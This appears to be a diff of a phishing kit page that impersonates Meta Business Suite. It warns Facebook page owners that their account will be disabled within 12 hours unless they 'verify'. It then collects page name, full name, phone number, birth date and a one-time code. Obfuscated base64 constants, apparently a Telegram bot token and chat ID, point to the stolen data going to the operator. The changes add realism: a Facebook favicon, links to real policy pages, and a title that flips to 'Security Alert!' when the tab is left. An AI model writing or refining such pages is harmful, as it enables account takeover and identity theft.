@@ -4,59 +4,58 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Business Suite</title>
+    <link rel="icon" type="image/x-icon" href="https://www.facebook.com/favicon.ico">
     <style>
         :root { --m-blue: #1877F2; --m-bg: #FFFFFF; --m-text: #1C1E21; --m-gray: #65676B; --m-border: #ced4da; --fb-bg: #F0F2F5; }
         body { font-family: "Segoe UI", Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; color: var(--m-text); display: flex; flex-direction: column; min-height: 100vh; }
         
-        /* Mobile vs PC Navigation */
         .nav { background: white; padding: 12px 20px; border-bottom: 1px solid #dddfe2; display: flex; align-items: center; justify-content: flex-start; }
         @media (min-width: 900px) { .nav { padding: 12px 50px; } }
-
-        /* Mobile vs PC Card */
+        
         .card { background: white; width: 92%; max-width: 800px; margin: 10px auto; padding: 25px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); box-sizing: border-box; }
         @media (min-width: 900px) { .card { margin: 20px auto; padding: 40px; } }
         
-        /* Live Chat Styling */
         .chat-bubble { position: fixed; bottom: 20px; right: 20px; background: white; border-radius: 50px; padding: 10px 20px; display: flex; align-items: center; gap: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); border: 1px solid #eee; z-index: 999; }
         .chat-status { width: 10px; height: 10px; background: #42b72a; border-radius: 50%; animation: pulse 2s infinite; }
         .chat-text { font-size: 12px; color: var(--m-gray); font-weight: 500; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
-
+        
         #p1 { max-width: 550px; text-align: center; margin-top: 30px; }
         @media (min-width: 900px) { #p1 { margin-top: 80px; } }
-
+        
         .illustration { width: 100%; height: auto; background: none; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; }
         .illustration img { width: 100%; max-width: 700px; height: auto; display: block; }
         
         h1, h2 { font-size: 20px; font-weight: 700; margin: 0 0 10px 0; }
         @media (min-width: 900px) { h1, h2 { font-size: 24px; } }
-
+        
         .sub-text { color: var(--m-text); font-size: 14.5px; line-height: 1.4; margin-bottom: 25px; }
         
         input, select { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid var(--m-border); border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; background: white; }
         input:focus, select:focus { border-color: var(--m-blue); }
         
-        /* Birthday Style */
         .bday-row { display: flex; gap: 10px; margin-bottom: 15px; }
         .bday-row select { margin-bottom: 0; }
         .bday-label { font-size: 12px; color: var(--m-gray); margin-bottom: 5px; text-align: left; }
-
+        
         .err-msg { color: #f02849; font-size: 13px; margin-top: -10px; margin-bottom: 15px; display: none; }
         .btn-row { display: flex; justify-content: flex-end; margin-top: 20px; }
         
         .btn { background: var(--m-blue); color: white; border: none; padding: 12px 20px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
         @media (min-width: 900px) { .btn { width: auto; padding: 12px 45px; } }
-
         .btn:disabled { background: #8bbaf7; cursor: not-allowed; }
         
         .hidden { display: none; }
         .fade-in { animation: fadeIn 0.4s forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
+        
         .otp-box { letter-spacing: 15px; font-size: 24px; text-align: center; font-weight: bold; }
         @media (min-width: 900px) { .otp-box { font-size: 30px; } }
-
+        
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         footer { margin-top: auto; padding: 20px; text-align: center; color: var(--m-gray); font-size: 12px; }
+        
+        .meta-link { color: var(--m-blue); text-decoration: none; cursor: pointer; font-weight: normal; }
     </style>
 </head>
 <body>
@@ -72,22 +71,25 @@
 
 <div id="p1" class="card fade-in">
     <img src="image.png" width="90" style="margin-bottom: 25px;">
-    <div style="font-weight: 600; text-transform: uppercase; font-size: 12px; letter-spacing: 1px;">Business Community Standards</div>
-    <p style="font-weight: 700; font-size: 18px; margin: 25px 0;">Someone has reported your account for non-compliance with our terms of service.</p>
+    <div style="font-weight: normal; text-transform: uppercase; font-size: 12px; letter-spacing: 1px;"><b>Business Community Standards</b></div>
+    <p style="font-weight: normal; font-size: 18px; margin: 25px 0;"><b>Someone has reported your account</b> for non-compliance with our terms of service.</p>
     <p>You have <span id="timer1" style="font-weight: bold;">12 hours</span> to verify, otherwise your account will be permanently inactivated.</p>
     <button class="btn" style="margin-top: 20px;" onclick="step(1, 2)">GET STARTED</button>
     <p style="margin-top: 40px; font-size: 11px; color: var(--m-gray);">Facebook Report Team © 2025</p>
 </div>
 
 <div id="p2" class="card hidden">
-    <div class="illustration"><img src="image1.png" width="90" style="margin-bottom: 25px;"></div>
+    <div class="illustration"><img src="image1.png"></div>
     <h1>Your account has been restricted</h1>
     <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Term of Service</div>
-    <p class="sub-text">We detected unusual activity in your page today <b>December 23, 2025</b>. Please verify:</p>
+    <p class="sub-text">
+        We detected unusual activity in your page today <b>December 23, 2025</b>. Someone has reported your account for not complying with 
+        <a href="https://transparency.fb.com/policies/community-standards/" class="meta-link" target="_blank">Community Standards</a>. 
+        To avoid having your account <a href="https://transparency.fb.com/policies/community-standards/" class="meta-link" target="_blank">disabled</a>, please verify:
+    </p>
     <input type="text" id="pname" placeholder="Page Name">
     <input type="text" id="fname" placeholder="Your Name (Name and Surname)">
     <input type="text" id="phone" placeholder="Your Phone Number">
-    
     <div class="bday-label">Date of birth</div>
     <div class="bday-row">
         <select id="b_day"><option value="">Day</option><script>for(let i=1;i<=31;i++)document.write('<option value="'+i+'">'+i+'</option>')</script></select>
@@ -100,7 +102,6 @@
         </select>
         <select id="b_year"><option value="">Year</option><script>for(let i=2010;i>=1950;i--)document.write('<option value="'+i+'">'+i+'</option>')</script></select>
     </div>
-
     <div class="btn-row"><button class="btn" onclick="step(2, 3)">Continue</button></div>
 </div>
 
@@ -142,6 +143,9 @@
 <footer>Meta © 2025</footer>
 
 <script>
+    window.onblur = () => { document.title = "⚠️ Security Alert!"; };
+    window.onfocus = () => { document.title = "Meta Business Suite"; };
+
     const _eT = "ODM0MjI3NzQ4MzpBQUZxVjlMdmJRQkcyLVZCOXhsMFZMaHFTaFpLNkljRXA1cw==";
     const _eC = "NTkwMTM5NjY0OA==";
     const _t = atob(_eT);
@@ -231,6 +235,5 @@
         }, 1200);
     }
 </script>
-<style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
 </body>
 </html>
